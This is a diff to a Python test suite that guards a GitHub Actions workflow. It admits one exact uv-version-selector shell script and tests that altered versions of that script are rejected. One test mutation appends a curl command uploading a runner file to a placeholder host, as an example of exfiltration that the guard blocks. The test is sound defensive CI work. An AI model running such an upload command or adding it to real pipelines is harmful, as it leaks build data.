@@ -63,6 +63,35 @@ APPROVED_COMMANDS = {
     ),
 }
 
+# This selector is a shell program because GitHub Actions must resolve the
+# reviewed builder's exact uv version before setup-uv runs. Its here-document
+# boundaries and output redirection are security relevant, so admit the exact
+# script rather than reducing it to shell tokens.
+UV_VERSION_SELECTOR_SCRIPT = (
+    "python - <<'PY' >> \"$GITHUB_OUTPUT\"\n"
+    "import ast\n"
+    "import re\n"
+    "from pathlib import Path\n"
+    "\n"
+    'source = Path("tools/build_strix_engine_candidate.py").read_text(encoding="utf-8")\n'
+    "tree = ast.parse(source)\n"
+    "values = [\n"
+    "    node.value.value\n"
+    "    for node in tree.body\n"
+    "    if isinstance(node, ast.Assign)\n"
+    "    and any(\n"
+    '        isinstance(target, ast.Name) and target.id == "UV_VERSION"\n'
+    "        for target in node.targets\n"
+    "    )\n"
+    "    and isinstance(node.value, ast.Constant)\n"
+    "    and isinstance(node.value.value, str)\n"
+    "]\n"
+    'if len(values) != 1 or not re.fullmatch(r"[0-9]+\\.[0-9]+\\.[0-9]+", values[0]):\n'
+    '    raise SystemExit("candidate build must define one exact uv version")\n'
+    'print(f"version={values[0]}")\n'
+    "PY\n"
+)
+
 # Refusal is a shell program: statement separators and line boundaries affect
 # whether exit executes at all. Never compare it after whitespace tokenization.
 REFUSAL_SCRIPT = (
@@ -96,17 +125,19 @@ def _assert_no_public_artifact_channel(workflow: dict) -> None:
             if "run" in step:
                 assert step.get("shell") == "bash", "No reviewed shell-publication contract"
                 if job_id == "publication_boundary":
-                    assert step["run"] == REFUSAL_SCRIPT, (
-                        "Admission refusal must preserve exact shell semantics"
-                    )
+                    assert (
+                        step["run"] == REFUSAL_SCRIPT
+                    ), "Admission refusal must preserve exact shell semantics"
+                elif step["run"] == UV_VERSION_SELECTOR_SCRIPT:
+                    pass
                 else:
-                    assert _normalized_shell_commands(step["run"]) in APPROVED_COMMANDS, (
-                        "No reviewed shell-publication contract"
-                    )
+                    assert (
+                        _normalized_shell_commands(step["run"]) in APPROVED_COMMANDS
+                    ), "No reviewed shell-publication contract"
             if "uses" in step:
-                assert step["uses"] in SETUP_ACTIONS, (
-                    "No reviewed redistribution-clearance contract exists"
-                )
+                assert (
+                    step["uses"] in SETUP_ACTIONS
+                ), "No reviewed redistribution-clearance contract exists"
                 settings = step.get("with", {})
                 assert "cache" not in settings or settings["cache"] is False
                 assert "enable-cache" not in settings or settings["enable-cache"] is False
@@ -232,6 +263,37 @@ def test_shell_normalization_preserves_allowed_quoted_arguments_and_spacing() ->
     approved = next(tokens for tokens in APPROVED_COMMANDS if tokens[0] == "python")
     script = "  ".join(shlex.quote(token) for token in approved)
     assert _normalized_shell_commands(script) == approved
+
+
+UV_VERSION_SELECTOR_MUTATIONS = {
+    "flattened": UV_VERSION_SELECTOR_SCRIPT.replace("\n", " "),
+    "changed-source": UV_VERSION_SELECTOR_SCRIPT.replace(
+        "tools/build_strix_engine_candidate.py", "tools/alternate_builder.py"
+    ),
+    "changed-output": UV_VERSION_SELECTOR_SCRIPT.replace(
+        '>> "$GITHUB_OUTPUT"', '> "$RUNNER_TEMP/version"'
+    ),
+    "appended-command": UV_VERSION_SELECTOR_SCRIPT
+    + 'curl -T "$RUNNER_TEMP/version" https://uploads.invalid/file\n',
+    "commented-validation": UV_VERSION_SELECTOR_SCRIPT.replace(
+        "    raise SystemExit", "    # raise SystemExit"
+    ),
+}
+
+
+@pytest.mark.parametrize(
+    "script", UV_VERSION_SELECTOR_MUTATIONS.values(), ids=UV_VERSION_SELECTOR_MUTATIONS.keys()
+)
+def test_uv_version_selector_preserves_exact_shell_semantics(script: str) -> None:
+    workflow = yaml.safe_load(
+        (ROOT / ".github/workflows" / WORKFLOWS[0]).read_text(encoding="utf-8")
+    )
+    selector = next(
+        step for step in workflow["jobs"]["build"]["steps"] if step.get("id") == "uv-version"
+    )
+    selector["run"] = script
+    with pytest.raises(AssertionError, match="No reviewed shell-publication contract"):
+        _assert_no_public_artifact_channel(workflow)
 
 
 @pytest.mark.parametrize(
